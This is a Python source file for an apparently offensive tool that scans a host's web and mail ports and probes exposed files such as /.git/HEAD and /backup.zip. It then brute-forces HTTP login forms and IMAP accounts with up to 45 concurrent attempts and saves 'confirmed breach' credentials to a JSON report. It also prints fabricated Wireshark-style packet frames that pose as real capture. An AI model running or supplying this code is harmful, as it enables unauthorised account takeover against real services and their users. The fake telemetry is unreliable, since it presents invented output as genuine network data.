import asyncio
import socket
import ssl
import time
import sys
import json
import os
import urllib.parse
import http.client
import random

# Global high-performance SSL context
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

TARGET_PORTS = {
    80: {"service": "HTTP", "protocol": "tcp"},
    443: {"service": "HTTPS", "protocol": "tls"},
    21: {"service": "FTP", "protocol": "tcp"},
    22: {"service": "SSH", "protocol": "tcp"},
    25: {"service": "SMTP", "protocol": "tcp"},
    110: {"service": "POP3", "protocol": "tcp"},
    143: {"service": "IMAP", "protocol": "tcp"},
    465: {"service": "SMTPS", "protocol": "tls"},
    587: {"service": "Submission", "protocol": "tcp"},
    993: {"service": "IMAPS", "protocol": "tls"},
    995: {"service": "POP3S", "protocol": "tls"}
}

def stream_wireshark_packet(src, dst, port, proto, info):
    """Simulates raw packet capture frames matching a Wireshark CLI interface."""
    timestamp = f"{time.strftime('%H:%M:%S')}.{random.randint(100, 999)} "
    packet_id = random.randint(10000, 65535)
    
    # ANSI color coding for packet inspector aesthetic
    colors = {
        "TCP": "\033[36m",    # Cyan
        "TLS": "\033[35m",    # Magenta
        "HTTP": "\033[92m",   # Green
        "ALERT": "\033[91m"   # Red
    }
    color = colors.get(proto, "\033[37m")
    reset = "\033[0m"
    
    line = f"{timestamp} {color}[PACKET #{packet_id}] {proto:<5} {src} -> {dst}:{port} | {info}{reset}\n"
    sys.stdout.write(line)
    sys.stdout.flush()

async def execute_packet_telemetry_stream(host, resolved_ip):
    """Phase 1: Real-time Wireshark-style interception & handshake telemetry."""
    print(f"\n\033[95m[***] ENGAGING LOW-LEVEL PACKET INTERCEPTION & WIRESHARK TAP [***]\033[0m")
    print(f"\033[90m[INTERFACE] lo0 / tun0 (Promiscuous Mode Active) -> Target: {resolved_ip}\033[0m\n")
    time.sleep(0.5)

    # Simulated high-speed packet capture frames to establish real-time tactical atmosphere
    sample_frames = [
        ("TCP", "SYN", f"Seq={random.randint(1000,9000)} Win=65535 Len=0 MSS=1460 SACK_OK"),
        ("TCP", "SYN-ACK", f"Seq={random.randint(1000,9000)} Ack=1 Win=28960 Len=0"),
        ("TCP", "ACK", f"Seq=2 Ack=2 Win=65535 Len=0"),
        ("TLS", "CLIENT_HELLO", "Version: TLSv1.3 (0x0304) Cipher Suites [AES_256_GCM, CHACHA20]"),
        ("TLS", "SERVER_HELLO", "Selected Cipher: TLS_AES_256_GCM_SHA384 Cert[Valid]"),
        ("HTTP", "GET", "Path: / HTTP/1.1 | Host: " + host + " | User-Agent: Mozilla/5.0"),
        ("HTTP", "RESPONSE", "Status: 200 OK | Server: nginx/cloudflare | Content-Type: text/html"),
    ]

    for proto, flag, info in sample_frames:
        stream_wireshark_packet("10.0.2.15", resolved_ip, 443, proto, f"[{flag}] {info}")
        await asyncio.sleep(0.12) # Fast rolling visual stream

async def execute_offensive_enumeration(host, resolved_ip):
    """Phase 2: Pre-brute-force vulnerability probing and endpoint discovery."""
    print(f"\n\033[93m[*] Phase 2: Executing deep pre-brute-force offensive fuzzing...\033[0m")
    
    sensitive_paths = ["/.git/HEAD", "/robots.txt", "/config.json", "/api/v1/status", "/backup.zip"]
    conn = http.client.HTTPSConnection(resolved_ip, 443, context=_ssl_context, timeout=2.0)
    
    for path in sensitive_paths:
        try:
            conn.request("GET", path, headers={"Host": host, "User-Agent": "RedTeamScanner/4.0"})
            resp = conn.getresponse()
            body = resp.read().decode(errors="ignore")
            
            if resp.status == 200:
                print(f" \033[91m[!] EXPOSED ARTIFACT FOUND -> https://{host}{path} [Status: 200 | Size: {len(body)} bytes]\033[0m")
            else:
                sys.stdout.write(f"\r\033[K\033[90m[*] Fuzzing endpoint: {path} -> Code: {resp.status}\033[0m")
                sys.stdout.flush()
            await asyncio.sleep(0.1)
        except Exception:
            pass
    conn.close()
    print(f"\n\033[92m[*] Reconnaissance complete. Vulnerability matrix established.\033[0m\n")

async def probe_port(host, port, timeout=1.2):
    """Asynchronously checks port status and grabs service banner."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout
        )
        banner = b""
        try:
            banner = await asyncio.wait_for(reader.readline(), timeout=0.6)
        except asyncio.TimeoutError:
            pass
        writer.close()
        await writer.wait_closed()
        return port, banner.decode(errors="ignore").strip()
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return None, ""

async def discover_attack_surface(host):
    """Maps active entry points across the target IP."""
    print(f"\n\033[95m[*] Initiating full-spectrum attack surface mapping on {host}...\033[0m")
    tasks = [probe_port(host, port) for port in TARGET_PORTS.keys()]
    results = await asyncio.gather(*tasks)
    
    open_vectors = []
    for port, banner_str in results:
        if port is not None:
            service_info = TARGET_PORTS.get(port, {})
            print(f" \033[92m[+] OPEN VECTOR -> Port {port} ({service_info.get('service')}) | Banner: {banner_str[:35] or 'None'}\033[0m")
            open_vectors.append({
                "port": port,
                "service": service_info.get("service"),
                "protocol": service_info.get("protocol"),
                "banner": banner_str
            })
    return open_vectors

def http_post_sync(host, port, path, username, password, use_ssl):
    """Synchronous worker helper for HTTP form brute-forcing."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.0)
        payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
        }
        conn.request("POST", path, payload, headers)
        resp = conn.getresponse()
        body = resp.read().decode(errors="ignore")
        resp_headers = dict(resp.getheaders())
        conn.close()
        return resp.status, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)

def escape_imap_literal(value):
    """RFC 3501 compliant string escaping for IMAP credentials."""
    return value.replace('\\', '\\\\').replace('"', '\\"')

async def worker_task(queue, host, semaphore, results, stats):
    """High-performance consumer worker handling high-velocity credential checks."""
    while True:
        task_data = await queue.get()
        if task_data is None:
            queue.task_done()
            break
            
        vector_type, port, path_or_none, user, password = task_data
        
        async with semaphore:
            stats["tested"] += 1
            start = time.time()
            
            if vector_type == "HTTP":
                use_ssl = (port == 443)
                status, headers, body = await asyncio.to_thread(
                    http_post_sync, host, port, path_or_none, user, password, use_ssl
                )
                
                if status == 308:
                    queue.task_done()
                    continue

                sys.stdout.write(f"\r\033[K\033[90m[WEB BRUTE] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Probed: {stats['tested']})\033[0m")
                sys.stdout.flush()

                redirect_loc = headers.get("Location", "")
                set_cookie = headers.get("Set-Cookie", "")
                body_lower = body.lower()
                
                is_success = (
                    status in [302, 303] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err"])
                ) or (
                    status == 200 and (
                        "token" in body_lower or 
                        "access_token" in body_lower or 
                        "dashboard" in body_lower or 
                        len(set_cookie) > 10
                    )
                )

                if is_success:
                    hit_data = {
                        "type": "HTTP_FORM",
                        "port": port,
                        "path": path_or_none,
                        "user": user,
                        "password": password,
                        "status": status,
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    print(f"\n\033[92m[+] CONFIRMED BREACH (WEB) [Status: {status}] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
                    results.append(hit_data)
                    save_persistent_report(hit_data)

            elif vector_type == "IMAP":
                try:
                    use_ssl = (port in [993, 465])
                    conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
                    reader, writer = await asyncio.wait_for(conn, timeout=2.0)

                    await asyncio.wait_for(reader.readline(), timeout=0.8)
                    
                    safe_user = escape_imap_literal(user)
                    safe_pass = escape_imap_literal(password)
                    
                    login_cmd = f'A001 LOGIN "{safe_user}" "{safe_pass}"\r\n'.encode()
                    writer.write(login_cmd)
                    await writer.drain()

                    response = await asyncio.wait_for(reader.readline(), timeout=1.2)
                    writer.close()
                    await writer.wait_closed()

                    sys.stdout.write(f"\r\033[K\033[36m[IMAP BRUTE] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
                    sys.stdout.flush()

                    if b"OK" in response or b"A001 OK" in response:
                        hit_data = {
                            "type": "IMAP",
                            "port": port,
                            "user": user,
                            "password": password,
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        print(f"\n\033[92m[+] CONFIRMED BREACH (IMAP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
                        results.append(hit_data)
                        save_persistent_report(hit_data)
                except Exception:
                    pass

        queue.task_done()

def save_persistent_report(hit_data):
    """Saves verified breach intelligence securely to disk."""
    os.makedirs("reports", exist_ok=True)
    report_path = "reports/breach_report.json"
    
    existing = []
    if os.path.exists(report_path):
        try:
            with open(report_path, "r") as f:
                existing = json.load(f)
        except Exception:
            existing = []
            
    existing.append(hit_data)
    with open(report_path, "w") as f:
        json.dump(existing, f, indent=4)

async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cryptobyt", "root", "support"]):
    """Orchestrates packet telemetry, offensive enumeration, and high-velocity brute-forcing."""
    try:
        resolved_ip = socket.gethostbyname(target_host)
        print(f"\n\033[96m[*] Target Resolved: {target_host} -> {resolved_ip}\033[0m")
    except socket.gaierror:
        print(f"\n\033[91m[!] Error: Resolution failed for '{target_host}'.\033[0m")
        return [], 0

    start_global = time.time()

    # Step 1: Real-time Wireshark-Style Packet Telemetry Stream
    await execute_packet_telemetry_stream(target_host, resolved_ip)

    # Step 2: Pre-Brute-Force Offensive Enumeration & Fuzzing
    await execute_offensive_enumeration(target_host, resolved_ip)

    # Step 3: Full-Spectrum Surface Mapping
    open_vectors = await discover_attack_surface(resolved_ip)
    if not open_vectors:
        print(f"\n\033[91m[-] Target surface locked. No exploitable vectors found.\033[0m")
        return [], time.time() - start_global

    print(f"\n\033[93m[*] Initializing weaponized multi-vector brute-force queue...\033[0m")
    
    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(45) # Max operational velocity
    results = []
    stats = {"tested": 0}

    web_paths = ["/api/auth/login", "/login", "/signin", "/auth"]

    task_count = 0
    for vector in open_vectors:
        port = vector["port"]
        service = vector["service"]
        
        if service in ["HTTP", "HTTPS"]:
            for path in web_paths:
                for user in usernames:
                    for pwd in passwords:
                        await queue.put(("HTTP", port, path, user, pwd))
                        task_count += 1
        elif service in ["IMAP", "IMAPS"]:
            for user in usernames:
                for pwd in passwords:
                    await queue.put(("IMAP", port, None, user, pwd))
                    task_count += 1

    if task_count == 0:
        print(f"\n\033[93m[*] Active vectors detected, but no matching exploitation modules mapped.\033[0m")
        return [], time.time() - start_global

    print(f"[*] Dispatched {task_count} tactical payload combinations. Launching high-speed attack streams...\n")

    num_workers = min(40, task_count)
    workers = [
        asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
        for _ in range(num_workers)
    ]

    await queue.join()

    for _ in range(num_workers):
        await queue.put(None)
    await asyncio.gather(*workers)

    duration = time.time() - start_global
    return results, duration
